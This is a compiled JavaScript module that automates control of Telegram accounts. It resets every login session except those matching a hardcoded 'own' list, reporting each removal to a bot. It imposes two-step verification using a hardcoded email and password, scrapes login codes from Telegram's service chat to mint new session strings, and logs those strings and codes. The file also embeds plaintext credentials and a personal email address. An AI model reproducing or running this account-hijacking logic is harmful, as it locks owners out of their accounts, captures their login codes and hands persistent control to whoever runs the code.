"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.isOwnAuth = isOwnAuth;
exports.removeOtherAuths = removeOtherAuths;
exports.getAuths = getAuths;
exports.getLastActiveTime = getLastActiveTime;
exports.hasPassword = hasPassword;
exports.set2fa = set2fa;
exports.createNewSession = createNewSession;
exports.waitForOtp = waitForOtp;
exports.getSessionInfo = getSessionInfo;
exports.terminateSession = terminateSession;
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const Helpers_1 = require("telegram/Helpers");
const big_integer_1 = __importDefault(require("big-integer"));
const parseError_1 = require("../../../utils/parseError");
const fetchWithTimeout_1 = require("../../../utils/fetchWithTimeout");
const logbots_1 = require("../../../utils/logbots");
const generateTGConfig_1 = require("../utils/generateTGConfig");
const IMap_1 = require("../../../IMap/IMap");
function isOwnAuth(auth) {
    const authCriteria = [
        { field: 'country', value: 'singapore' },
        { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
        { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] },
    ];
    return authCriteria.some(criterion => {
        const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';
        if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk'))
            return true;
        if ('values' in criterion) {
            return criterion.values.some(value => fieldValue.includes(value.toLowerCase()));
        }
        return fieldValue.includes(criterion.value.toLowerCase());
    });
}
async function removeOtherAuths(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    const result = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
    for (const auth of result.authorizations) {
        if (isOwnAuth(auth))
            continue;
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
        await resetAuthorization(ctx, auth);
    }
}
async function resetAuthorization(ctx, auth) {
    try {
        await ctx.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
    }
    catch (error) {
        (0, parseError_1.parseError)(error, `Failed to reset authorization for ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
    }
}
async function getAuths(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    return await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
}
async function getLastActiveTime(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    try {
        const result = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.forEach((auth) => {
            if (!isOwnAuth(auth)) {
                if (auth.dateActive && latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        if (latest === 0)
            return new Date().toISOString().split('T')[0];
        return new Date(latest * 1000).toISOString().split('T')[0];
    }
    catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error getting last active time:', error);
        return new Date().toISOString().split('T')[0];
    }
}
async function hasPassword(ctx) {
    if (!ctx.client)
        throw new Error('Client is not initialized');
    try {
        const passwordInfo = await ctx.client.invoke(new telegram_1.Api.account.GetPassword());
        return passwordInfo.hasPassword || false;
    }
    catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error checking password status:', error);
        return false;
    }
}
async function set2fa(ctx) {
    if (!(await hasPassword(ctx))) {
        ctx.logger.info(ctx.phoneNumber, 'Password Does not exist, Setting 2FA');
        const imapService = IMap_1.MailReader.getInstance();
        const twoFaDetails = {
            email: 'storeslaksmi@gmail.com',
            hint: 'password - India143',
            newPassword: 'Ajtdmwajt1@',
        };
        try {
            await imapService.connectToMail();
            const checkMailInterval = setInterval(async () => {
                ctx.logger.info(ctx.phoneNumber, 'Checking if mail is ready');
                if (imapService.isMailReady()) {
                    clearInterval(checkMailInterval);
                    ctx.logger.info(ctx.phoneNumber, 'Mail is ready, checking code!');
                    await ctx.client.updateTwoFaSettings({
                        isCheckPassword: false,
                        email: twoFaDetails.email,
                        hint: twoFaDetails.hint,
                        newPassword: twoFaDetails.newPassword,
                        emailCodeCallback: async (length) => {
                            ctx.logger.info(ctx.phoneNumber, 'Code sent');
                            return new Promise(async (resolve, reject) => {
                                let retry = 0;
                                const codeInterval = setInterval(async () => {
                                    try {
                                        ctx.logger.info(ctx.phoneNumber, 'Checking code');
                                        retry++;
                                        if (imapService.isMailReady() && retry < 4) {
                                            const code = await imapService.getCode();
                                            ctx.logger.info(ctx.phoneNumber, 'Code:', code);
                                            if (code) {
                                                await imapService.disconnectFromMail();
                                                clearInterval(codeInterval);
                                                resolve(code);
                                            }
                                        }
                                        else {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(new Error('Failed to retrieve code'));
                                        }
                                    }
                                    catch (error) {
                                        clearInterval(codeInterval);
                                        await imapService.disconnectFromMail();
                                        reject(error);
                                    }
                                }, 10000);
                            });
                        },
                        onEmailCodeError: (e) => {
                            ctx.logger.error(ctx.phoneNumber, 'Email code error:', (0, parseError_1.parseError)(e));
                            return Promise.resolve('error');
                        },
                    });
                    return twoFaDetails;
                }
                else {
                    ctx.logger.info(ctx.phoneNumber, 'Mail not ready yet');
                }
            }, 5000);
        }
        catch (e) {
            ctx.logger.error(ctx.phoneNumber, 'Unable to connect to mail server:', (0, parseError_1.parseError)(e));
        }
    }
    else {
        ctx.logger.info(ctx.phoneNumber, 'Password already exists');
    }
}
async function createNewSession(ctx) {
    const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000));
    const sessionPromise = (async () => {
        const me = await ctx.client.getMe();
        ctx.logger.info(ctx.phoneNumber, 'Creating new session for: ', me.phone);
        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, await (0, generateTGConfig_1.generateTGConfig)(ctx.phoneNumber));
        ctx.logger.info(ctx.phoneNumber, 'Starting Session Creation...');
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => 'Ajtdmwajt1@',
            phoneCode: async () => {
                ctx.logger.info(ctx.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');
                return await waitForOtp(ctx);
            },
            onError: (err) => { throw err; },
        });
        ctx.logger.info(ctx.phoneNumber, 'Session Creation Completed');
        const session = newClient.session.save();
        await newClient.destroy();
        ctx.logger.info(ctx.phoneNumber, 'New Session: ', session);
        return session;
    })();
    return Promise.race([sessionPromise, timeoutPromise]);
}
async function waitForOtp(ctx) {
    for (let i = 0; i < 3; i++) {
        try {
            ctx.logger.info(ctx.phoneNumber, 'Attempt : ', i);
            const messages = await ctx.client.getMessages('777000', { limit: 1 });
            const message = messages[0];
            if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                const code = message.text.split('.')[0].split('code:**')[1].trim();
                ctx.logger.info(ctx.phoneNumber, 'returning: ', code);
                return code;
            }
            else {
                ctx.logger.info(ctx.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);
                const code = message.text.split('.')[0].split('code:**')[1].trim();
                ctx.logger.info(ctx.phoneNumber, 'Skipped Code: ', code);
                if (i == 2)
                    return code;
                await (0, Helpers_1.sleep)(5000);
            }
        }
        catch (err) {
            await (0, Helpers_1.sleep)(2000);
            ctx.logger.info(ctx.phoneNumber, err);
        }
    }
    throw new Error('Failed to get OTP after 3 attempts');
}
async function getSessionInfo(ctx) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const [authorizationsResult, devicesResult] = await Promise.all([
        ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations()),
        ctx.client.invoke(new telegram_1.Api.account.GetWebAuthorizations()),
    ]);
    const sessions = authorizationsResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        deviceModel: auth.deviceModel,
        platform: auth.platform,
        systemVersion: auth.systemVersion,
        appName: auth.appName,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        country: auth.country,
        region: auth.region,
    }));
    const webSessions = devicesResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        domain: auth.domain,
        browser: auth.browser,
        platform: auth.platform,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        region: auth.region,
    }));
    return { sessions, webSessions };
}
async function terminateSession(ctx, options) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    if (options.exceptCurrent) {
        if (options.type === 'app') {
            await ctx.client.invoke(new telegram_1.Api.auth.ResetAuthorizations());
        }
        else {
            await ctx.client.invoke(new telegram_1.Api.account.ResetWebAuthorizations());
        }
        return true;
    }
    if (options.type === 'app') {
        await ctx.client.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: (0, big_integer_1.default)(options.hash) }));
    }
    else {
        await ctx.client.invoke(new telegram_1.Api.account.ResetWebAuthorization({ hash: (0, big_integer_1.default)(options.hash) }));
    }
    return true;
}
//# sourceMappingURL=auth-operations.js.map